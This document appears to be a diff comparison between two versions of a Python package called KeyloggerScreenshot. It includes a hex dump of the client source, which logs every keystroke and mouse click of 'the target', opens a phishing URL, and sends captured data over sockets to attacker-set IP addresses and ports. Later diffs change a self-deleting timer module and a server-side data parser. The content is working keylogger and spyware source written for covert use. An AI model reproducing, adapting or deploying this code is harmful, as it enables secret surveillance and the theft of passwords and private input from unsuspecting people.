+00002250: 7465 2e61 7070 656e 6428 6461 7461 290d  te.append(data).
+00002260: 0a0d 0a20 2020 2064 6566 2070 7269 6e74  ...    def print
+00002270: 5f77 6f72 6b28 7365 6c66 2c20 776f 7264  _work(self, word
+00002280: 293a 0d0a 2020 2020 2020 2020 7072 696e  ):..        prin
+00002290: 7428 6627 416c 7068 6162 6574 6963 206b  t(f'Alphabetic k
+000022a0: 6579 2077 6173 2070 7265 7373 6564 3a20  ey was pressed: 
+000022b0: 7b77 6f72 647d 2027 290d 0a20 2020 2020  {word} ')..     
+000022c0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
+000022d0: 5f6c 6973 7465 202b 3d20 776f 7264 0d0a  _liste += word..
+000022e0: 2020 2020 2020 2020 2320 4576 6572 7920          # Every 
+000022f0: 7072 6573 7365 6420 6b65 7920 7769 6c6c  pressed key will
+00002300: 2062 6520 7361 7665 6420 696e 2022 7269   be saved in "ri
+00002310: 6368 7469 6765 5f6c 6973 7465 2220 7468  chtige_liste" th
+00002320: 6973 2069 7320 6120 6765 726d 616e 2073  is is a german s
+00002330: 656c 662e 776f 7264 2061 6e64 206d 6561  elf.word and mea
+00002340: 6e73 2022 7269 6768 745f 6c69 7374 220d  ns "right_list".
+00002350: 0a0d 0a20 2020 2064 6566 206f 6e5f 7072  ...    def on_pr
+00002360: 6573 7328 7365 6c66 2c20 6b65 7929 3a0d  ess(self, key):.
+00002370: 0a20 2020 2020 2020 2074 7279 3a0d 0a20  .        try:.. 
+00002380: 2020 2020 2020 2020 2020 2074 7279 3a0d             try:.
+00002390: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000023a0: 206f 7468 6572 5f63 6861 7265 6374 6572   other_charecter
+000023b0: 7320 3d20 7b22 3122 3a20 2221 222c 2022  s = {"1": "!", "
+000023c0: 3222 3a20 2722 272c 2022 3322 3a20 22c2  2": '"', "3": ".
+000023d0: a722 2c20 2234 223a 2022 2422 2c20 2235  .", "4": "$", "5
+000023e0: 223a 2022 2522 2c20 2236 223a 2022 2622  ": "%", "6": "&"
+000023f0: 2c20 2237 223a 2022 2f22 2c20 2238 223a  , "7": "/", "8":
+00002400: 2022 2822 2c0d 0a20 2020 2020 2020 2020   "(",..         
+00002410: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002420: 2020 2020 2020 2020 2020 2022 3922 3a20             "9": 
+00002430: 2229 222c 2022 3022 3a20 223d 222c 2022  ")", "0": "=", "
+00002440: c39f 223a 2022 3f22 7d0d 0a20 2020 2020  ..": "?"}..     
+00002450: 2020 2020 2020 2020 2020 2069 6620 7365             if se
+00002460: 6c66 2e63 6170 7320 6973 2054 7275 653a  lf.caps is True:
+00002470: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002480: 2020 2020 2020 6966 206b 6579 2e63 6861        if key.cha
+00002490: 7220 696e 206f 7468 6572 5f63 6861 7265  r in other_chare
+000024a0: 6374 6572 733a 0d0a 2020 2020 2020 2020  cters:..        
+000024b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000024c0: 7365 6c66 2e77 6f72 6420 3d20 6f74 6865  self.word = othe
+000024d0: 725f 6368 6172 6563 7465 7273 5b6b 6579  r_charecters[key
+000024e0: 2e63 6861 725d 0d0a 2020 2020 2020 2020  .char]..        
+000024f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002500: 2320 5570 7065 7220 4368 6172 6163 7465  # Upper Characte
+00002510: 7273 2066 726f 6d20 2231 2220 746f 2022  rs from "1" to "
+00002520: 3022 2062 6563 6175 7365 2061 6c6c 2074  0" because all t
+00002530: 6869 7320 6e75 6d62 6572 7320 6172 6520  his numbers are 
+00002540: 6e6f 7420 6368 6172 6563 7465 7273 2061  not charecters a
+00002550: 7265 206e 6f74 2069 6e20 7079 6e70 7574  re not in pynput
+00002560: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002570: 2020 2020 2020 656c 7365 3a0d 0a20 2020        else:..   
+00002580: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002590: 2020 2020 2073 656c 662e 776f 7264 203d       self.word =
+000025a0: 206b 6579 2e63 6861 722e 7570 7065 7228   key.char.upper(
+000025b0: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+000025c0: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
+000025d0: 2020 2020 2020 2020 2020 2020 2020 7365                se
+000025e0: 6c66 2e77 6f72 6420 3d20 6b65 792e 6368  lf.word = key.ch
+000025f0: 6172 0d0a 0d0a 2020 2020 2020 2020 2020  ar....          
+00002600: 2020 2020 2020 616c 6c5f 7265 715f 6b65        all_req_ke
+00002610: 7973 203d 207b 2203 223a 2073 656c 662e  ys = {".": self.
+00002620: 636f 7079 5f64 6174 612c 2022 1622 3a20  copy_data, ".": 
+00002630: 7365 6c66 2e61 7070 656e 645f 7061 7374  self.append_past
+00002640: 657d 0d0a 2020 2020 2020 2020 2020 2020  e}..            
+00002650: 2020 2020 2320 2245 5458 2220 7374 616e      # "ETX" stan
+00002660: 6473 2066 6f72 2022 456e 642d 5465 7874  ds for "End-Text
+00002670: 2d63 6861 7261 6374 6572 2220 616e 6420  -character" and 
+00002680: 6973 2061 2063 6f6e 7472 6f6c 2063 6861  is a control cha
+00002690: 7261 6374 6572 2077 6869 6368 206b 6e6f  racter which kno
+000026a0: 7773 2074 6865 2063 6861 7261 6374 6572  ws the character
+000026b0: 206f 6620 636f 7079 696e 6720 736f 6d65   of copying some
+000026c0: 7468 696e 6720 6f6e 2074 6865 206b 6579  thing on the key
+000026d0: 626f 6172 640d 0a20 2020 2020 2020 2020  board..         
+000026e0: 2020 2020 2020 2023 2022 5359 4e22 2073         # "SYN" s
+000026f0: 7461 6e64 7320 666f 7220 2253 796e 6368  tands for "Synch
+00002700: 726f 6e6f 7573 2049 646c 6522 2061 6e64  ronous Idle" and
+00002710: 2069 7320 6120 636f 6e74 726f 6c20 6368   is a control ch
+00002720: 6172 6163 7465 7220 7768 6963 6820 6b6e  aracter which kn
+00002730: 6f77 7320 7468 6520 6368 6172 6163 7465  ows the characte
+00002740: 7220 6f66 2070 6173 7469 6e67 2073 6f6d  r of pasting som
+00002750: 6574 6869 6e67 206f 6e20 7468 6520 6b65  ething on the ke
+00002760: 7962 6f61 7264 0d0a 2020 2020 2020 2020  yboard..        
+00002770: 2020 2020 2020 2020 666f 7220 6561 6368          for each
+00002780: 5f6b 6579 2069 6e20 616c 6c5f 7265 715f  _key in all_req_
+00002790: 6b65 7973 3a0d 0a20 2020 2020 2020 2020  keys:..         
+000027a0: 2020 2020 2020 2020 2020 2069 6620 6561             if ea
+000027b0: 6368 5f6b 6579 203d 3d20 6b65 792e 6368  ch_key == key.ch
+000027c0: 6172 3a0d 0a20 2020 2020 2020 2020 2020  ar:..           
+000027d0: 2020 2020 2020 2020 2020 2020 2023 2049               # I
+000027e0: 6620 7468 6520 636f 7079 2063 6861 7261  f the copy chara
+000027f0: 6374 6572 2069 7320 7072 6573 7365 642c  cter is pressed,
+00002800: 2065 6163 6820 6675 6e63 7469 6f6e 206f   each function o
+00002810: 6620 6561 6368 2063 6861 7261 6374 6572  f each character
+00002820: 2077 696c 6c20 6265 2077 6f72 6b69 6e67   will be working
+00002830: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002840: 2020 2020 2020 2020 2020 616c 6c5f 7265            all_re
+00002850: 715f 6b65 7973 5b65 6163 685f 6b65 795d  q_keys[each_key]
+00002860: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
+00002870: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
+00002880: 2020 2020 2020 2020 2020 2020 2020 6173                as
+00002890: 6369 5f6e 756d 6265 7220 3d20 6f72 6428  ci_number = ord(
+000028a0: 7365 6c66 2e77 6f72 6429 0d0a 2020 2020  self.word)..    
+000028b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000028c0: 2320 4f72 6469 6e61 6c20 6e75 6d62 6572  # Ordinal number
+000028d0: 2069 6e20 7468 6520 7261 6e67 6520 6f66   in the range of
+000028e0: 2030 2074 6f20 3331 2063 6f6d 706c 6574   0 to 31 complet
+000028f0: 6573 2061 6c6c 2073 7065 6369 616c 2063  es all special c
+00002900: 6861 7261 6374 6572 7320 7769 7468 2074  haracters with t
+00002910: 6865 206b 6579 2022 7374 7267 202b 206c  he key "strg + l
+00002920: 6574 7465 7222 0d0a 2020 2020 2020 2020  etter"..        
+00002930: 2020 2020 2020 2020 2020 2020 6966 2061              if a
+00002940: 7363 695f 6e75 6d62 6572 206e 6f74 2069  sci_number not i
+00002950: 6e20 7261 6e67 6528 302c 2033 3229 3a0d  n range(0, 32):.
+00002960: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002970: 2020 2020 2020 2020 2023 2069 6620 7468           # if th
+00002980: 6572 6520 6973 206e 6f20 7370 6563 6961  ere is no specia
+00002990: 6c20 6368 6172 6163 7465 7220 6974 206a  l character it j
+000029a0: 7573 7420 7072 696e 7473 2074 6865 2061  ust prints the a
+000029b0: 6c70 6861 6265 7469 6320 6e75 6d62 6572  lphabetic number
+000029c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000029d0: 2020 2020 2020 2020 2020 7365 6c66 2e70            self.p
+000029e0: 7269 6e74 5f77 6f72 6b28 7365 6c66 2e77  rint_work(self.w
+000029f0: 6f72 6429 0d0a 0d0a 2020 2020 2020 2020  ord)....        
+00002a00: 2020 2020 2020 2020 6578 6365 7074 2054          except T
+00002a10: 7970 6545 7272 6f72 3a0d 0a20 2020 2020  ypeError:..     
+00002a20: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00002a30: 2070 7269 6e74 7320 7468 6520 616c 7068   prints the alph
+00002a40: 6162 6574 6320 6e75 6d62 6572 0d0a 2020  abetc number..  
+00002a50: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002a60: 2020 7365 6c66 2e70 7269 6e74 5f77 6f72    self.print_wor
+00002a70: 6b28 7365 6c66 2e77 6f72 6429 0d0a 0d0a  k(self.word)....
+00002a80: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002a90: 7072 696e 7428 7365 6c66 2e72 6963 6874  print(self.richt
+00002aa0: 6967 655f 6c69 7374 6529 0d0a 2020 2020  ige_liste)..    
+00002ab0: 2020 2020 2020 2020 6578 6365 7074 2054          except T
+00002ac0: 7970 6545 7272 6f72 3a0d 0a20 2020 2020  ypeError:..     
+00002ad0: 2020 2020 2020 2020 2020 2070 6173 730d             pass.
+00002ae0: 0a0d 0a20 2020 2020 2020 2065 7863 6570  ...        excep
+00002af0: 7420 4174 7472 6962 7574 6545 7272 6f72  t AttributeError
+00002b00: 3a0d 0a20 2020 2020 2020 2020 2020 2070  :..            p
+00002b10: 7269 6e74 2866 2741 6e20 6f74 6865 7220  rint(f'An other 
+00002b20: 6b65 7920 7761 7320 7072 6573 7365 643a  key was pressed:
+00002b30: 207b 6b65 797d 2729 0d0a 2020 2020 2020   {key}')..      
+00002b40: 2020 2020 2020 6966 206b 6579 203d 3d20        if key == 
+00002b50: 6b65 7962 6f61 7264 2e4b 6579 2e73 7061  keyboard.Key.spa
+00002b60: 6365 206f 7220 6b65 7920 3d3d 206b 6579  ce or key == key
+00002b70: 626f 6172 642e 4b65 792e 7461 623a 0d0a  board.Key.tab:..
+00002b80: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002b90: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
+00002ba0: 7374 6520 2b3d 2022 7b22 0d0a 2020 2020  ste += "{"..    
+00002bb0: 2020 2020 2020 2020 2020 2020 2320 4966              # If
+00002bc0: 2074 6865 2074 6172 6765 7420 7072 6573   the target pres
+00002bd0: 7365 7320 7461 6220 6f72 2073 7061 6365  ses tab or space
+00002be0: 2061 2022 7b22 2077 696c 6c20 6265 2061   a "{" will be a
+00002bf0: 7070 656e 6465 6420 746f 2074 6865 206c  ppended to the l
+00002c00: 6973 7420 736f 2074 6865 2061 7474 6163  ist so the attac
+00002c10: 6b65 7220 6b6e 6f77 7320 7768 656e 2061  ker knows when a
+00002c20: 6e64 0d0a 2020 2020 2020 2020 2020 2020  nd..            
+00002c30: 2020 2020 2320 7370 6163 6520 6f72 2061      # space or a
+00002c40: 2074 6162 206b 6579 2068 6173 2062 6565   tab key has bee
+00002c50: 6e20 7072 6573 7365 640d 0a20 2020 2020  n pressed..     
+00002c60: 2020 2020 2020 2065 6c69 6620 6b65 7920         elif key 
+00002c70: 3d3d 206b 6579 626f 6172 642e 4b65 792e  == keyboard.Key.
+00002c80: 6361 7073 5f6c 6f63 6b3a 0d0a 2020 2020  caps_lock:..    
+00002c90: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+00002ca0: 2e63 6170 7320 3d20 5472 7565 0d0a 2020  .caps = True..  
+00002cb0: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00002cc0: 6c66 2e63 6865 636b 2e61 7070 656e 6428  lf.check.append(
+00002cd0: 3129 0d0a 2020 2020 2020 2020 2020 2020  1)..            
+00002ce0: 6368 6563 6b5f 6361 7073 203d 2073 756d  check_caps = sum
+00002cf0: 2873 656c 662e 6368 6563 6b29 202f 2032  (self.check) / 2
+00002d00: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+00002d10: 4966 2063 6865 636b 5f63 6170 7320 6973  If check_caps is
+00002d20: 206e 6f74 2070 7269 6d61 7279 2069 7420   not primary it 
+00002d30: 7769 6c6c 2073 6574 2073 656c 662e 6361  will set self.ca
+00002d40: 7073 2074 6f20 4661 6c73 650d 0a0d 0a20  ps to False.... 
+00002d50: 2020 2020 2020 2020 2020 2069 6620 7374             if st
+00002d60: 7228 6368 6563 6b5f 6361 7073 295b 2d31  r(check_caps)[-1
+00002d70: 5d20 213d 2027 3027 3a0d 0a20 2020 2020  ] != '0':..     
+00002d80: 2020 2020 2020 2020 2020 2070 6173 730d             pass.
+00002d90: 0a20 2020 2020 2020 2020 2020 2065 6c73  .            els
+00002da0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
+00002db0: 2020 2020 7365 6c66 2e63 6170 7320 3d20      self.caps = 
+00002dc0: 4661 6c73 650d 0a20 2020 2020 2020 2020  False..         
+00002dd0: 2020 2020 2020 2023 2054 6869 7320 7265         # This re
+00002de0: 7365 7473 2065 7665 7279 7468 696e 670d  sets everything.
+00002df0: 0a0d 0a20 2020 2020 2020 2020 2020 2069  ...            i
+00002e00: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
+00002e10: 642e 4b65 792e 6261 636b 7370 6163 653a  d.Key.backspace:
+00002e20: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002e30: 2020 6474 203d 2064 6174 6574 696d 652e    dt = datetime.
+00002e40: 6e6f 7728 290d 0a20 2020 2020 2020 2020  now()..         
+00002e50: 2020 2020 2020 2023 2047 6574 7320 7468         # Gets th
+00002e60: 6520 6375 7272 656e 7420 7469 6d65 0d0a  e current time..
+00002e70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002e80: 6765 745f 7469 6d65 203d 2073 7472 2864  get_time = str(d
+00002e90: 7429 2e73 706c 6974 2822 3a22 290d 0a20  t).split(":").. 
+00002ea0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00002eb0: 2054 6869 7320 7370 6c69 7473 2074 6865   This splits the
+00002ec0: 2074 696d 6520 736f 2074 6865 206d 696e   time so the min
+00002ed0: 7574 6573 2061 6e64 2073 6563 6f6e 6473  utes and seconds
+00002ee0: 2061 7265 2064 6973 706c 6179 6564 0d0a   are displayed..
+00002ef0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002f00: 2020 686f 7572 2c20 6d69 6e75 7465 732c    hour, minutes,
+00002f10: 2073 6563 203d 2069 6e74 2867 6574 5f74   sec = int(get_t
+00002f20: 696d 655b 305d 5b3a 3a2d 315d 5b30 3a32  ime[0][::-1][0:2
+00002f30: 5d5b 3a3a 2d31 5d29 2c20 696e 7428 6765  ][::-1]), int(ge
+00002f40: 745f 7469 6d65 5b31 5d29 2c20 666c 6f61  t_time[1]), floa
+00002f50: 7428 6765 745f 7469 6d65 5b32 5d29 0d0a  t(get_time[2])..
+00002f60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002f70: 2320 4765 7473 2074 6865 2063 7572 7265  # Gets the curre
+00002f80: 6e74 2068 6f75 722c 206d 696e 7574 6520  nt hour, minute 
+00002f90: 616e 6420 7365 636f 6e64 0d0a 0d0a 2020  and second....  
+00002fa0: 2020 2020 2020 2020 2020 2020 2020 616c                al
+00002fb0: 6c20 3d20 686f 7572 202a 2033 3630 3020  l = hour * 3600 
+00002fc0: 2b20 6d69 6e75 7465 7320 2a20 3630 202b  + minutes * 60 +
+00002fd0: 2073 6563 0d0a 2020 2020 2020 2020 2020   sec..          
+00002fe0: 2020 2020 2020 2320 4765 7473 2074 6865        # Gets the
+00002ff0: 2073 6563 6f6e 6473 206f 6620 6576 6572   seconds of ever
+00003000: 7974 6869 6e67 2066 726f 6d20 686f 7572  ything from hour
+00003010: 2074 6f20 7365 636f 6e64 0d0a 2020 2020   to second..    
+00003020: 2020 2020 2020 2020 2020 2020 6966 206e              if n
+00003030: 6f74 2073 656c 662e 7365 636f 6e64 733a  ot self.seconds:
+00003040: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003050: 2020 2020 2020 2320 4966 2074 6865 7265        # If there
+00003060: 2069 7320 6e6f 7468 696e 6720 696e 2074   is nothing in t
+00003070: 6865 206c 6973 7420 7365 636f 6e64 2077  he list second w
+00003080: 696c 6c20 6265 2061 7070 616e 6465 640d  ill be appanded.
+00003090: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000030a0: 2020 2020 2073 656c 662e 7365 636f 6e64       self.second
+000030b0: 732e 6170 7065 6e64 2861 6c6c 290d 0a20  s.append(all).. 
+000030c0: 2020 2020 2020 2020 2020 2020 2020 206d                 m
+000030d0: 696e 7573 203d 2061 6c6c 202d 2073 656c  inus = all - sel
+000030e0: 662e 7365 636f 6e64 735b 305d 0d0a 2020  f.seconds[0]..  
+000030f0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+00003100: 5468 6973 2063 6865 636b 7320 6966 2074  This checks if t
+00003110: 6865 2074 6172 6765 7420 6973 2068 6f6c  he target is hol
+00003120: 6469 6e67 2074 6865 2062 6163 6b73 7061  ding the backspa
+00003130: 6365 206b 6579 0d0a 2020 2020 2020 2020  ce key..        
+00003140: 2020 2020 2020 2020 6966 206d 696e 7573          if minus
+00003150: 203e 2030 2e30 3520 6f72 206d 696e 7573   > 0.05 or minus
+00003160: 203d 3d20 302e 303a 0d0a 2020 2020 2020   == 0.0:..      
+00003170: 2020 2020 2020 2020 2020 2020 2020 6966                if
+00003180: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
+00003190: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
+000031a0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
+000031b0: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
+000031c0: 7465 2e70 6f70 282d 3129 0d0a 2020 2020  te.pop(-1)..    
+000031d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000031e0: 2020 2020 2320 5265 6d6f 7665 7320 7468      # Removes th
+000031f0: 6520 6c61 7374 2069 7465 6d20 6f66 2074  e last item of t
+00003200: 6865 206c 6973 740d 0a0d 0a20 2020 2020  he list....     
+00003210: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00003220: 7365 636f 6e64 735b 305d 203d 2061 6c6c  seconds[0] = all
+00003230: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00003240: 2020 2320 4c69 7374 2077 696c 6c20 616c    # List will al
+00003250: 6c77 6179 7320 6265 2075 7064 6174 6564  lways be updated
+00003260: 0d0a 0d0a 2020 2020 6465 6620 6f6e 5f72  ....    def on_r
+00003270: 656c 6561 7365 2873 656c 662c 206b 6579  elease(self, key
+00003280: 293a 0d0a 2020 2020 2020 2020 7072 696e  ):..        prin
+00003290: 7428 6627 4b65 7920 7265 6c65 6173 6564  t(f'Key released
+000032a0: 3a20 7b6b 6579 7d27 290d 0a0d 0a20 2020  : {key}')....   
+000032b0: 2064 6566 2073 7461 7274 2873 656c 6629   def start(self)
+000032c0: 3a0d 0a20 2020 2020 2020 2069 6620 7365  :..        if se
+000032d0: 6c66 2e70 6869 7368 696e 6720 6973 206e  lf.phishing is n
+000032e0: 6f74 204e 6f6e 653a 0d0a 2020 2020 2020  ot None:..      
+000032f0: 2020 2020 2020 7768 696c 6520 5472 7565        while True
+00003300: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00003310: 2020 2074 7279 3a0d 0a20 2020 2020 2020     try:..       
+00003320: 2020 2020 2020 2020 2020 2020 2072 6573               res
+00003330: 706f 6e73 6520 3d20 7265 7175 6573 7473  ponse = requests
+00003340: 2e67 6574 2873 656c 662e 7068 6973 6869  .get(self.phishi
+00003350: 6e67 290d 0a20 2020 2020 2020 2020 2020  ng)..           
+00003360: 2020 2020 2020 2020 2023 2052 6573 706f           # Respo
+00003370: 6e65 2069 7320 6865 7265 2074 6f20 7365  ne is here to se
+00003380: 6520 6966 2074 6865 2077 6562 7369 7465  e if the website
+00003390: 2069 7320 6f6e 6c69 6e65 206f 7220 6e6f   is online or no
+000033a0: 740d 0a20 2020 2020 2020 2020 2020 2020  t..             
+000033b0: 2020 2020 2020 2077 6562 6272 6f77 7365         webbrowse
+000033c0: 722e 6f70 656e 2873 656c 662e 7068 6973  r.open(self.phis
+000033d0: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
+000033e0: 2020 2020 2020 2020 2020 2062 7265 616b             break
+000033f0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+00003400: 2020 2020 6578 6365 7074 2072 6571 7565      except reque
+00003410: 7374 732e 6578 6365 7074 696f 6e73 2e43  sts.exceptions.C
+00003420: 6f6e 6e65 6374 696f 6e45 7272 6f72 3a0d  onnectionError:.
+00003430: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00003440: 2020 2020 2070 7269 6e74 2822 4e6f 2063       print("No c
+00003450: 6f6e 6e65 6374 696f 6e22 290d 0a20 2020  onnection")..   
+00003460: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003470: 2073 7973 2e65 7869 7428 290d 0a0d 0a20   sys.exit().... 
+00003480: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
+00003490: 5f74 6872 6561 6420 3d20 7468 7265 6164  _thread = thread
+000034a0: 696e 672e 5468 7265 6164 2874 6172 6765  ing.Thread(targe
+000034b0: 743d 7365 6c66 2e64 6174 656e 5f61 7566  t=self.daten_auf
+000034c0: 6e65 6865 6d65 6e29 0d0a 2020 2020 2020  nehemen)..      
+000034d0: 2020 2320 5468 6973 2072 756e 7320 7468    # This runs th
+000034e0: 6520 7072 6f67 7261 6d6d 2062 6568 696e  e programm behin
+000034f0: 6420 7468 6520 6163 7475 616c 2070 726f  d the actual pro
+00003500: 6772 616d 6d69 6e67 0d0a 2020 2020 2020  gramming..      
+00003510: 2020 6c69 7374 656e 696e 675f 7468 7265    listening_thre
+00003520: 6164 2e73 7461 7274 2829 0d0a 0d0a 2020  ad.start()....  
+00003530: 2020 2020 2020 7468 7265 6164 696e 675f        threading_
+00003540: 6d6f 7573 6520 3d20 7468 7265 6164 696e  mouse = threadin
+00003550: 672e 5468 7265 6164 2874 6172 6765 743d  g.Thread(target=
+00003560: 7365 6c66 2e61 6c6c 5f63 6c69 636b 7329  self.all_clicks)
+00003570: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
+00003580: 2072 756e 7320 7468 6520 7072 6f67 7261   runs the progra
+00003590: 6d6d 2062 6568 696e 6420 7468 6520 6163  mm behind the ac
+000035a0: 7475 616c 2070 726f 6772 616d 6d69 6e67  tual programming
+000035b0: 0d0a 2020 2020 2020 2020 7468 7265 6164  ..        thread
+000035c0: 696e 675f 6d6f 7573 652e 7374 6172 7428  ing_mouse.start(
+000035d0: 290d 0a0d 0a20 2020 2020 2020 2073 656e  )....        sen
+000035e0: 645f 7469 6d65 7220 3d20 736f 636b 6574  d_timer = socket
+000035f0: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
+00003600: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
+00003610: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
+00003620: 2020 2020 2073 656e 645f 7469 6d65 722e       send_timer.
+00003630: 636f 6e6e 6563 7428 2873 656c 662e 6970  connect((self.ip
+00003640: 5f74 696d 6572 2c20 7365 6c66 2e70 6f72  _timer, self.por
+00003650: 745f 7469 6d65 7229 290d 0a0d 0a20 2020  t_timer))....   
+00003660: 2020 2020 2073 656e 645f 7469 6d65 722e       send_timer.
+00003670: 7365 6e64 2873 7472 2873 656c 662e 6475  send(str(self.du
+00003680: 7261 7469 6f6e 292e 656e 636f 6465 2829  ration).encode()
+00003690: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
+000036a0: 7320 7365 6e64 7320 7468 6520 7365 636f  s sends the seco
+000036b0: 6e64 7320 746f 2074 6865 2073 6572 7665  nds to the serve
+000036c0: 720d 0a20 2020 2020 2020 2073 656e 645f  r..        send_
+000036d0: 7469 6d65 722e 636c 6f73 6528 290d 0a0d  timer.close()...
+000036e0: 0a20 2020 2020 2020 2074 696d 6572 5f64  .        timer_d
+000036f0: 656c 6574 655f 6469 7220 3d20 736f 636b  elete_dir = sock
+00003700: 6574 2e73 6f63 6b65 7428 736f 636b 6574  et.socket(socket
+00003710: 2e41 465f 494e 4554 2c20 736f 636b 6574  .AF_INET, socket
+00003720: 2e53 4f43 4b5f 5354 5245 414d 290d 0a20  .SOCK_STREAM).. 
+00003730: 2020 2020 2020 2074 696d 6572 5f64 656c         timer_del
+00003740: 6574 655f 6469 722e 636f 6e6e 6563 7428  ete_dir.connect(
+00003750: 2822 3132 372e 302e 302e 3122 2c20 3130  ("127.0.0.1", 10
+00003760: 3737 2929 0d0a 0d0a 2020 2020 2020 2020  77))....        
+00003770: 7469 6d65 725f 6465 6c65 7465 5f64 6972  timer_delete_dir
+00003780: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
+00003790: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
+000037a0: 2929 0d0a 2020 2020 2020 2020 7469 6d65  ))..        time
+000037b0: 725f 6465 6c65 7465 5f64 6972 2e63 6c6f  r_delete_dir.clo
+000037c0: 7365 2829 0d0a 0d0a 2020 2020 2020 2020  se()....        
+000037d0: 7769 7468 206b 6579 626f 6172 642e 4c69  with keyboard.Li
+000037e0: 7374 656e 6572 286f 6e5f 7072 6573 733d  stener(on_press=
+000037f0: 7365 6c66 2e6f 6e5f 7072 6573 732c 206f  self.on_press, o
+00003800: 6e5f 7265 6c65 6173 653d 7365 6c66 2e6f  n_release=self.o
+00003810: 6e5f 7265 6c65 6173 6529 2061 7320 6c69  n_release) as li
+00003820: 7374 656e 6572 3a0d 0a20 2020 2020 2020  stener:..       
+00003830: 2020 2020 2073 656c 662e 636f 756e 7464       self.countd
+00003840: 6f77 6e5f 7365 6e64 2873 656c 662e 6475  own_send(self.du
+00003850: 7261 7469 6f6e 2c20 7365 6c66 2e69 705f  ration, self.ip_
+00003860: 7068 6f74 6f73 2c20 7365 6c66 2e70 6f72  photos, self.por
+00003870: 745f 7068 6f74 6f73 2c20 7365 6c66 2e69  t_photos, self.i
+00003880: 705f 6b65 796c 6f67 6765 722c 0d0a 2020  p_keylogger,..  
+00003890: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000038a0: 2020 2020 2020 2020 2020 2020 2020 7365                se
+000038b0: 6c66 2e70 6f72 745f 6b65 796c 6f67 6765  lf.port_keylogge
+000038c0: 7229 0d0a 2020 2020 2020 2020 2020 2020  r)..            
+000038d0: 6c69 7374 656e 6572 2e6a 6f69 6e28 290d  listener.join().
+000038e0: 0a20 2020 2020 2020 2020 2020 2023 2054  .            # T
+000038f0: 6869 7320 6c69 7374 656e 7320 746f 2074  his listens to t
+00003900: 6865 206b 6579 7320 7468 6174 2077 6865  he keys that whe
+00003910: 7265 2074 7970 6564 0d0a                 re typed..
```

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Local_Deleter.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Local_Deleter.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,23 +1,22 @@
 import os
 import shutil
 import socket
 import ast
 import time
 import threading
-import BetterPrinting as bp
 
 
 class DeleteList:
     lst = None
 
     @staticmethod
     def countdown(seconds):
-        # 20 seconds more than the regular time
-        seconds += 20
+        # 15 seconds more than the regular time
+        seconds += 15
         
         while seconds:
             time.sleep(1)
             seconds -= 1
             
         os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_keylogger.py`

 * *Files 2% similar despite different names*

```diff
@@ -89,15 +89,15 @@
 
             self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
             if ")]" in self.full_msg:
                 if "***%§§)§§%" in self.full_msg:
                     self.new_cor = "[(" + self.full_msg.split("[(")[1]
                     spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
